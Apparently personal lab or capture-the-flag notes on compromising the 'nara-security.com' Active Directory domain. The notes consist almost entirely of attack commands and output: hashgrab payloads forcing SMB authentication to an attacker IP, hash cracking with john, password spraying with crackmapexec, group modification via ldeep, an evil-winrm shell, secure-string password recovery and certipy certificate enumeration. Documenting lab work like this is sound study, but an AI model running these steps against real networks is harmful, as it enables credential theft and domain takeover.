[https://github.com/xct/hashgrab](#https://github.com/xct/hashgrab)
\(Generates scf, url \& lnk payloads to put onto a smb share\. These force authentication to an attacker machine in order to grab hashes \(for example with responder\)\.

-  python hashgrab\.py 192\.168\.45\.199 xct
-  impacket\-smbserver \-smb2support share share

Tracy\.White::NARASEC:aaaaaaaaaaaaaaaa:5031b71370eabb4d92bd7b10b285c9dc:010100000000000080ced9057387da016476587c4c5a382300000000010010004a006d00450055005800570074007000030010004a006d004500550058005700740070000200100042004b006a007900660046006a0052000400100042004b006a007900660046006a0052000700080080ced9057387da010600040002000000080030003000000000000000010000000020000035516f9a1fd364d6dc040b1460e2df97725d895898dd4ecdc9923e2b457fe4950a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100390039000000000000000000

-  john tracywhite\.hash \-\-wordlist=/usr/share/wordlists/rockyou\.txt
zqwj041FGX       \(Tracy\.White\) 

Tracy\.White:zqwj041FGX

-  crackmapexec smb 192\.168\.239\.30 \-u 'Tracy\.White' \-p 'zqwj041FGX' \-\-users
Tracy\.White
Jemma\.Humphries
Carolyn\.Hill
Jodie\.Summers
Declan\.Reynolds
Jasmine\.Roberts
Sara\.O'Sullivan
Helen\.Robinson
Damian\.Johnson
Amelia\.O'Brien
Administrator
krbtgt
Guest

-  crackmapexec smb 192\.168\.239\.30 \-u users\.txt \-p 'zqwj041FGX' \-\-continue\-on\-success
SMB         192\.168\.239\.30  445    NARA             \[\+\] nara\-security\.com\\Tracy\.White:zqwj041FGX \(tested password against all users\)

-  add nara\.nara\-security\.com \& nara\-security\.com in /etc/hosts

-  poetry run crackmapexec ldap nara\.nara\-security\.com \-u 'Tracy\.White' \-p 'zqwj041FGX' \-\-bloodhound \-ns 192\.168\.239\.30 \-c All
SMB         192\.168\.239\.30  445    NARA             \[\*\] Windows 10\.0 Build 20348 x64 \(name:NARA\) \(domain:nara\-security\.com\) \(signing:True\) \(SMBv1:False\)
LDAP        192\.168\.239\.30  389    NARA             \[\+\] nara\-security\.com\\Tracy\.White:zqwj041FGX 
LDAP        192\.168\.239\.30  389    NARA             Resolved collection methods: **psremote**, objectprops, rdp, dcom, localadmin, container, group, session, trusts, acl
LDAP        192\.168\.239\.30  389    NARA             Done in 00M 07S
LDAP        192\.168\.239\.30  389    NARA             Compressing output into /home/kali/\.cme/logs/NARA\_192\.168\.239\.30\_2024\-04\-05\_124649bloodhound\.zip

\*\* PSREMOTE allows WinRM

-  add user Tracy White to REMOTE ACCESS group

-  ldeep ldap \-s ldap://192\.168\.239\.30 \-d nara\-security\.com \-u 'Tracy\.White' \-p 'zqwj041FGX' add\_to\_group "CN=TRACY WHITE,OU=STAFF,DC=NARA\-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=REMOTE,DC=NARA\-SECURITY,DC=COM"

-  evil\-winrm \-i nara\-security\.com \-u 'Tracy\.White' \-p 'zqwj041FGX'

\*Evil\-WinRM\* PS C:\\Users\\tracy\.white\\Documents\> dir
-  automation\.txt
Enrollment Automation Account
01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b

[https://www.sharepointwidgets.com/2021/01/secure-password-with-powershell.html](#https://www.sharepointwidgets.com/2021/01/secure-password-with-powershell.html)


-   $securePassword = Get\-Content hash\.txt | ConvertTo\-SecureString
-  \[System\.Runtime\.InteropServices\.Marshal\]::PtrToStringAuto\(\[System\.Runtime\.InteropServices\.Marshal\]::SecureStringToBSTR\($securePassword\)\)
-  hHO\_S9gff7ehXw

-  password spray using CME
SMB         192\.168\.239\.30  445    NARA             \[\+\] nara\-security\.com\\Jodie\.Summers:hHO\_S9gff7ehXw

[https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation](#https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)


-  certipy\-ad find \-u 'Jodie\.Summers' \-p 'hHO\_S9gff7ehXw' \-dc\-ip nara\-security\.com \-dns\-tcp \-ns 192\.168\.239\.30 \-bloodhound


